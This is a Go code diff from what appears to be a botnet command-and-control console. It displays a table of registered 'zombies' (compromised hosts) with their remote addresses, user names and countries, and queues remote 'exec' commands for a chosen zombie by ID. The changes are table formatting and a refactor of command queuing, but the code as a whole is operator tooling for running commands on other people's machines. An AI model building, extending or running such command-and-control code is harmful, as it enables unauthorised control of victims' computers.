@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"database/sql"
 	"fmt"
+	"github.com/jedib0t/go-pretty/v6/table"
 	"log"
 	"strconv"
 	"strings"
@@ -87,13 +88,28 @@ func Show(object_type string, db *sql.DB) {
 		if err := rows.Err(); err != nil {
 			log.Fatal(err)
 		}
-
+		zombieNbr := len(zombies)
+		t := table.NewWriter()
+		t.AppendHeader(table.Row{
+			"ID", "SessionId", "RemoteAddr", "RemotePort", "UserName", "Country",
+		})
 		for _, zombie := range zombies {
 			// TODO : display it with tview.NewTable
-			fmt.Fprintf(textView, "ID: %d, SessionId: %s, RemoteAddr: %s, RemotePort: %s, UserName: %s, Country: %s\n",
-				zombie.Id, zombie.SessionId, zombie.RemoteAddr, zombie.RemotePort, zombie.UserName, zombie.Country)
+			t.AppendRow(table.Row{
+				zombie.Id,
+				zombie.SessionId,
+				zombie.RemoteAddr,
+				zombie.RemotePort,
+				zombie.UserName,
+				zombie.Country,
+			})
+
 		}
 
+		//t.SetAlignHeader(text.AlignCenter)
+		tableOutput := t.Render()
+		UILog(textView, "Number of zombies registered: "+strconv.Itoa(zombieNbr))
+		UILog(textView, tableOutput)
 		//DO REQUEST + DISPLAY TABLE
 		break
 	case "tasks":
@@ -104,14 +120,15 @@ func Show(object_type string, db *sql.DB) {
 
 func ExecCmd(sid string, args []string, db *sql.DB) {
 	ZAvailability(sid, db)
-	argsMap := argsToMap(args)
-	queueMutex.Lock()
-	commandQueue[sid] = &ResHeartBeat{
-		Type: "exec",
-		Args: argsMap,
-	}
-	queueMutex.Unlock()
-	LogEx("InputCommand Queue: "+"SID: "+sid+" Type: "+commandQueue[sid].Type+" Arguments: "+strings.Join(args, " "), true)
+	//argsMap := argsToMap(args)
+	AddToCmdQueue(sid, "exec", args, db)
+	//queueMutex.Lock()
+	//commandQueue[sid] = &ResHeartBeat{
+	//	Type: "exec",
+	//	Args: argsMap,
+	//}
+	//queueMutex.Unlock()
+	//LogEx("InputCommand Queue: "+"SID: "+sid+" Type: "+commandQueue[sid].Type+" Arguments: "+strings.Join(args, " "), true)
 }
 
 // TODO: find another way to interact with db cuz thats weird, nah?
@@ -178,7 +195,17 @@ func Interpreter(input string, db *sql.DB) {
 	case "help":
 		Help()
 	case "exec":
-		sid := splittedInput[1]
+
+		id, err := strconv.Atoi(splittedInput[1])
+		if err != nil {
+			fmt.Println("Error does not appear to be an integer: ", err)
+			return
+		}
+
+		sid := IdToSid(id, db)
+		if sid == "" {
+			Error("Wrong ID")
+		}
 		args := splittedInput[2:]
 		ExecCmd(sid, args, db)
 
